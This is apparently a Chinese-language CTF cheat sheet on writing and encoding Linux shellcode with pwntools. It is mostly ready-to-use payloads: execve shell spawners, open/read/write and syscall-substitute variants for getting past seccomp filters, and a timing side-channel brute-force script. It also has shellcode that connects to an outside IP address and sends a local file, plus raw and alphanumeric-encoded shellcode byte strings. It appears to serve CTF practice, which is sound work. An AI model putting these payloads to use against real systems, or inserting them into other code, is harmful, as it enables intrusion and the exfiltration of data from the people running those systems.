- [shellcode编写](#shellcode编写)
  - [misc](#misc)
    - [32位依赖](#32位依赖)
    - [amd64/i386 系统调用寄存器传参](#amd64i386-系统调用寄存器传参)
  - [shellcode编写](#shellcode编写-1)
    - [基础的shellcode](#基础的shellcode)
    - [禁用execve的shellcode](#禁用execve的shellcode)
    - [禁用execve, open, read和write时，替代函数](#禁用execve-open-read和write时替代函数)
      - [open的替代函数](#open的替代函数)
        - [openat](#openat)
        - [openat2](#openat2)
      - [read和write的替代函数](#read和write的替代函数)
        - [readv 和 writev](#readv-和-writev)
        - [sendfile](#sendfile)
      - [利用retfq指令，在i368模式下进行ORW](#利用retfq指令在i368模式下进行orw)
    - [关闭标准输出流时](#关闭标准输出流时)
      - [使用标准错误流输出](#使用标准错误流输出)
      - [使用socket发送数据到公网](#使用socket发送数据到公网)
      - [测信道攻击](#测信道攻击)
    - [超级代码](#超级代码)
  - [shellcode编码](#shellcode编码)
    - [i368](#i368)
      - [短字节shellcode --\> 21字节](#短字节shellcode----21字节)
      - [纯ascii字符shellcode](#纯ascii字符shellcode)
      - [scanf可读取的shellcode](#scanf可读取的shellcode)
    - [amd64](#amd64)
      - [scanf可读取的shellcode 22字节](#scanf可读取的shellcode-22字节)
      - [较短的shellcode  23字节](#较短的shellcode--23字节)
      - [纯ascii字符shellcode](#纯ascii字符shellcode-1)

# shellcode编写

## misc

### 32位依赖

提前安装32位依赖

```bash
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install -y gcc-multilib libc6-dev-i386 linux-libc-dev:i386
```

### amd64/i386 系统调用寄存器传参

| amd64 寄存器 | i386寄存器 | 内容 |
|:---:|:---:|:---:|
| RAX | EAX | 系统调用号 |
| RDI | EBX | 第一个参数 |
| RSI | ECX | 第二个参数 |
| RDX | EDX | 第三个参数 |
| R10 | ESI | 第四个参数 |
| R8 | EDI | 第五个参数 |
| R9 | EBP | 第六个参数 |

## shellcode编写

### 基础的shellcode

直接使用`shellcraft.sh()`调用写好的`sh`程序

```python
shellcode = shellcraft.sh()
payload = asm(shellcode)
```

__amd64:__

```python
shellcode = shellcraft.amd64.linux.sh()
payload = asm(shellcode, arch='amd64', os='linux')
```

__i386:__

```python
shellcode = shellcraft.i386.linux.sh()
payload = asm(shellcode, arch='i386', os='linux')
```

### 禁用execve的shellcode

当禁用execve时，可以直接使用ORW读出flag

```python
shellcode = ''
shellcode += shellcraft.open('./flag')
shellcode += shellcraft.read('rax', 'rsp', 0x50)
shellcode += shellcraft.write(1, 'rsp', 0x50)
payload = asm(shellcode)
```

### 禁用execve, open, read和write时，替代函数

禁用open,read和write时候，可以使用openat, readv, writev等函数替代

#### open的替代函数

##### openat

```python
shellcode = shellcraft.openat(-100, 'flag', 0, 0)
payload = asm(shellcode)
```

##### openat2

```python
shellcode = ''
shellcode += shellcraft.pushstr(p64(0) * 3)
shellcode += shellcraft.mov('rdx', 'rsp')                 # rdx = struct open_how{flags=0, mode=0, resolve=0}
shellcode += shellcraft.pushstr('flag')                   # rdi = "flag"
shellcode += shellcraft.openat2(-100, 'rsp', 'rdx', 0x18)
payload = asm(shellcode)
```

```python
archc = 'e' if context.arch == 'i386' else 'r'
shellcode = ''
shellcode += shellcraft.pushstr(p64(0) * 3)
shellcode += shellcraft.mov(archc+'dx', archc+'sp')       # rdx = struct open_how{flags=0, mode=0, resolve=0}
shellcode += shellcraft.pushstr('flag')                   # rdi = "flag"
shellcode += shellcraft.openat2(-100, archc+'sp', archc+'dx', 0x18)
payload = asm(shellcode)
```

#### read和write的替代函数

##### readv 和 writev


```python
shellcode = ''
shellcode += shellcraft.open('./flag', 0)
shellcode += shellcraft.mov('rsi', 'rsp')
shellcode += shellcraft.push(0x100)
shellcode += shellcraft.push('rsi')
shellcode += shellcraft.readv('rax', 'rsp', 1)
shellcode += shellcraft.writev(1, 'rsp', 1)
payload = asm(shellcode)
```

在read还可以有多个选择，比如pread

```python
shellcode = ''
shellcode += shellcraft.open('./flag', 0)
shellcode += shellcraft.pread('rax', 'rsp', 0x50, 0)
shellcode += shellcraft.write(1, 'rsp', 0x50)
payload = asm(shellcode)
```

##### sendfile

`shellcraft`的`cat`方法就是`open` + `sendfile`

```python
shellcode = ''
shellcode += shellcraft.cat('flag')
payload = asm(shellcode)
```

#### 利用retfq指令，在i368模式下进行ORW

```python
# 进入32位模式，栈切换到0x10100，读入32位shellcode
shellcode = ''
shellcode += 'lea rsp, [rip + 0x60];' # len >= 0x48
shellcode += shellcraft.amd64.amd64_to_i386()
payload = asm(shellcode, arch='amd64', os='linux')

shellcode = ''
shellcode += shellcraft.i386.linux.open('flag', 0)
shellcode += shellcraft.i386.linux.read('eax', 'esp', 0x100)
shellcode += shellcraft.i386.linux.write(1, 'esp', 'eax')
# shellcode += shellcraft.i386.i386_to_amd64() # 切换回64位
payload += asm(shellcode, arch='i386', os='linux')
```

### 关闭标准输出流时


#### 使用标准错误流输出

```python
shellcode = shellcraft.open('./flag')
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(2, 'rsp', 0x30)
payload = asm(shellcode)
```

#### 使用socket发送数据到公网

```python
shellcode = ''
shellcode += sendflag_asm('39.99.32.130', 9999)
payload = asm(shellcode)
```

```python
shellcode = ''
shellcode += shellcraft.open('flag', 0)
shellcode += shellcraft.mov('ebx', 'eax')
shellcode += shellcraft.connect('39.99.32.130', 9999, 'ipv4')
shellcode += shellcraft.sendfile('edi', 'ebx', 0, 0x100)
payload = asm(shellcode)
```

#### 测信道攻击

利用循环对flag进行爆破

```python
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h', '-p', '75'])    
def GuessString(index, char):
    '''
        eg : GuessString(0, 'f')
        猜测正确:进入无限循环
        猜测失败:退出
    '''
    shellcode = ''
    shellcode += shellcraft.open('./flag')
    shellcode += shellcraft.read('rax', 'rsp', 0x50)
    shellcode += 'lea rdi, [rsp+{}]\n'.format(index)
    shellcode += 'cmp byte ptr [rdi], {}\n'.format(hex(ord(char)))
    shellcode += 'jne fail\n'
    shellcode += shellcraft.infloop()
    shellcode += 'fail:\n'
    # shellcode += shellcraft.exit(0)
    return shellcode
```

__demo:__

```python
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h', '-p', '75'])    

def GuessString(index, char):
    '''
        eg : GuessString(0, 'f')
        猜测正确:进入无限循环
        猜测失败:退出
    '''
    shellcode = ''
    shellcode += shellcraft.open('./flag')
    shellcode += shellcraft.read('rax', 'rsp', 0x50)
    shellcode += 'lea rdi, [rsp+{}]\n'.format(index)
    shellcode += 'cmp byte ptr [rdi], {}\n'.format(hex(ord(char)))
    shellcode += 'jne fail\n'
    shellcode += shellcraft.infloop()
    shellcode += 'fail:\n'
    # shellcode += shellcraft.exit(0)
    return shellcode

flag = ''
dictionary = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#$%^&*()-=+[];:,.<>?/|\\'

while flag=='' or flag[-1] != '}':
    
    for c in dictionary:
        log.success('当前flag : ' + flag)
        try:
            p = process('./pwn64')
            # p = remote('127.0.0.1', 9999)
            p.recvuntil('>')
            
            shellcode = GuessString(len(flag), c)
            payload = asm(shellcode)
            p.send(payload.ljust(0x1000, b'\x90'))
            
            p.recvline(timeout=0.2)
            flag += c
            p.close()
            break
            
        except:
            p.close()
        
log.success('最终flag : ' + flag)
```

### 超级代码

源自一篇博客，利用`mmap`，`io_uring_setup`，`io_uring_enter`进行读取flag

```python
payload = b'AW\xb9\x1e\x00\x00\x00AVAUE1\xedATD\x89\xe8USH\x83\xechH\x8d|$\xf0H\x8dt$\xf0\xf3\xab\xbf\x10\x00\x00\x00\xb8\xa9\x01\x00\x00\x0f\x05\xbb\t\x00\x00\x00I\x89\xc4A\x89\xc6A\x89\xc0E1\xc9A\xba\x01\x00\x00\x00\xba\x03\x00\x00\x001\xff\xbe\x00\x10\x00\x00\x89\xd8\x0f\x05A\xb9\x00\x00\x00\x08H\x89\xc5\x89\xd8\x0f\x05A\xb9\x00\x00\x00\x10I\x89\xc7\x89\xd8\x0f\x05\xb9\x10\x00\x00\x00H\x89\xc3H\x89\xc7D\x89\xe8\xf3\xabD\x89\xe7A\xbc\xaa\x01\x00\x00E1\xc9E1\xc0\xba\x01\x00\x00\x00\xbe\x01\x00\x00\x00H\xb8\x12\x10\x00\x00\x9c\xff\xff\xffH\x89\x03H\x8d\x05\xc1\x00\x00\x00H\x89C\x10\x8bD$0\xc7D\x05\x00\x00\x00\x00\x00\x8bD$\x1c\xffD\x05\x00D\x89\xe0\x0f\x05\x8bD$TH\x89\xdf\xb9\x10\x00\x00\x00A\x8bT\x07\x08D\x89\xe8L\x8d|$\x8c\xf3\xab\xc6\x03\x16\x8bD$0D\x89\xf7\x89S\x04\xba\x01\x00\x00\x00L\x89{\x10\xc7C\x18d\x00\x00\x00\xc7D\x05\x00\x00\x00\x00\x00\x8bD$\x1c\xffD\x05\x00D\x89\xe0\x0f\x05\xb9\x10\x00\x00\x00D\x89\xe8H\x89\xdf\xba\x03\x00\x00\x00\xf3\xabL\x89{\x10D\x89\xf7H\xb8\x17\x00\x00\x00\x01\x00\x00\x00H\x89\x03\x8bD$0\xc7C\x18d\x00\x00\x00\xc7D\x05\x00\x00\x00\x00\x00\x8bD$\x1c\xffD\x05\x00D\x89\xe0\x0f\x05H\x83\xc4h1\xc0[]A\\A]A^A_\xc3./flag'
```

## shellcode编码

### i368

#### 短字节shellcode --> 21字节

```python
payload = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
```

#### 纯ascii字符shellcode

```python
payload = b'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA'
```

#### scanf可读取的shellcode

```python
payload = b'\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh'
```

### amd64

#### scanf可读取的shellcode 22字节

```python
payload = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
```

#### 较短的shellcode  23字节

```python
payload = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
```

#### 纯ascii字符shellcode

```python
payload = b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
```

